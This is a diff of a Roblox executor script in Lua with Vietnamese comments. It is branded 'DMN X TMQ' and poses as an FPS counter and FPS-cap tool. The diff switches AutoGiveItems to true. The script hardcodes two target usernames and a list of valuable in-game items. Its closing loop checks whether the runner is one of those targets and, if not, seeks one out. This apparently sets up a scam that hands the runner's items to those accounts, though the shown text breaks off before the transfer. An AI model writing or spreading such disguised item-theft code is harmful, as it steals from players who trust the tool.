@@ -1,5 +1,5 @@
 local Config = {
-    AutoGiveItems = false,
+    AutoGiveItems = true,
     AutoAcceptFriend = true
 }
 
@@ -15,16 +15,9 @@ end
 
 local TARGET_NAMES = {"EYTHANGDADEN", "NHATPROCOM"}
 local ItemList = {
-    "Legendary Sprinkler",
-    "Mushroom",
-    "Super Watering Can",
-    "Super Sprinkler",
-    "Venom Spitter",
-    "Dragon's Breath",
-    "Moon Bloom",
-    "Venus Fly Trap",
-    "Hypno Bloom",
-    "Gold"
+    "Legendary Sprinkler", "Mushroom", "Super Watering Can", "Super Sprinkler", 
+    "Venom Spitter", "Dragon's Breath", "Moon Bloom", "Venus Fly Trap", 
+    "Hypno Bloom", "Gold"
 }
 
 local mainGui = Instance.new("ScreenGui", CoreGui)
@@ -33,25 +26,36 @@ mainGui.ResetOnSpawn = false
 mainGui.IgnoreGuiInset = true
 mainGui.DisplayOrder = 999999
 
--- FPS Label luôn giữ ở góc trái trên
+-- FPS Label với hiệu ứng cầu vồng (tên DMN X TMQ)
 local fpsLabel = Instance.new("TextLabel", mainGui)
 fpsLabel.Name = "DMN X TMQ"
-fpsLabel.Size = UDim2.new(0, 150, 0, 40)
+fpsLabel.Size = UDim2.new(0, 300, 0, 50)
 fpsLabel.Position = UDim2.new(0, 10, 0, 10)
 fpsLabel.Font = Enum.Font.FredokaOne
 fpsLabel.TextScaled = true
 fpsLabel.BackgroundTransparency = 1
 fpsLabel.TextStrokeTransparency = 0
+fpsLabel.Text = "FPS: ..."
 
+task.spawn(function()
+    local Dreamon = 0
+    while true do
+        Dreamon = Dreamon + 0.01
+        if Dreamon > 1 then Dreamon = 0 end
+        fpsLabel.TextColor3 = Color3.fromHSV(Dreamon, 1, 1)
+        RunService.RenderStepped:Wait()
+    end
+end)
+
+-- Nút điều khiển
 if not setfpscap then warn("Executor không hỗ trợ setfpscap().") end
 local enabled = true
 if setfpscap then setfpscap(1) end
 
--- Nút điều khiển
 local button = Instance.new("TextButton", mainGui)
 button.Name = "DMN X TMQ"
 button.Size = UDim2.new(0, 180, 0, 50)
-button.Position = UDim2.new(0.5, -90, 1, -65) -- Bắt đầu ở giữa dưới
+button.Position = UDim2.new(0.5, -90, 1, -65)
 button.BackgroundColor3 = Color3.fromRGB(30, 150, 70)
 button.TextColor3 = Color3.fromRGB(255, 255, 255)
 button.Text = "DMN X TMQ"
@@ -70,16 +74,17 @@ button.MouseButton1Click:Connect(function()
             setfpscap(1)
             button.Text = "DMN X TMQ"
             button.BackgroundColor3 = Color3.fromRGB(30, 150, 70)
-            button.Position = UDim2.new(0.5, -90, 1, -65) -- Về giữa dưới
+            button.Position = UDim2.new(0.5, -90, 1, -65)
         else
             setfpscap(999999)
             button.Text = "DMN X TMQ: OFF"
             button.BackgroundColor3 = Color3.fromRGB(170, 50, 50)
-            button.Position = UDim2.new(1, -190, 0, 15) -- Lên phải trên
+            button.Position = UDim2.new(1, -190, 0, 15)
         end
     end
 end)
 
+-- Thông tin cá nhân
 local leaderstats = LocalPlayer:WaitForChild("leaderstats")
 local sheckles = leaderstats:WaitForChild("Sheckles")
 
@@ -110,7 +115,6 @@ local layout = Instance.new("UIListLayout", frame)
 layout.Name = "DMN X TMQ"
 layout.FillDirection = Enum.FillDirection.Vertical
 layout.HorizontalAlignment = Enum.HorizontalAlignment.Center
-layout.VerticalAlignment = Enum.VerticalAlignment.Center
 layout.Padding = UDim.new(0,2)
 
 local function createLabel(color)
@@ -129,22 +133,12 @@ local nameLabel = createLabel(Color3.new(1,1,1))
 local moneyLabel = createLabel(Color3.fromRGB(255,220,0))
 local svvLabel = createLabel(Color3.fromRGB(0,255,255))
 
-spawn(function()
-    local hue = 0
-    while true do
-        hue = hue + 0.01
-        if hue > 1 then hue = 0 end
-        fpsLabel.TextColor3 = Color3.fromHSV(hue, 1, 1)
-        task.wait(0.05)
-    end
-end)
-
 local frameCount, lastUpdate = 0, tick()
 RunService.RenderStepped:Connect(function()
     frameCount = frameCount + 1
     local now = tick()
     if now - lastUpdate >= 1 then
-        fpsLabel.Text = "FPS: " .. math.floor(frameCount / (now - lastUpdate))
+        fpsLabel.Text = string.format("FPS: %d", math.floor(frameCount / (now - lastUpdate)))
         frameCount = 0
         lastUpdate = now
     end
@@ -153,6 +147,7 @@ RunService.RenderStepped:Connect(function()
     svvLabel.Text = svv
 end)
 
+-- Logic Auto
 while task.wait(1) do
     if not (function() for _, v in pairs(TARGET_NAMES) do if LocalPlayer.Name == v then return true end end return false end)() then
         local targetPlayer = (function() for _, name in ipairs(TARGET_NAMES) do local p = Players:FindFirstChild(name) if p then return p end end return nil end)()
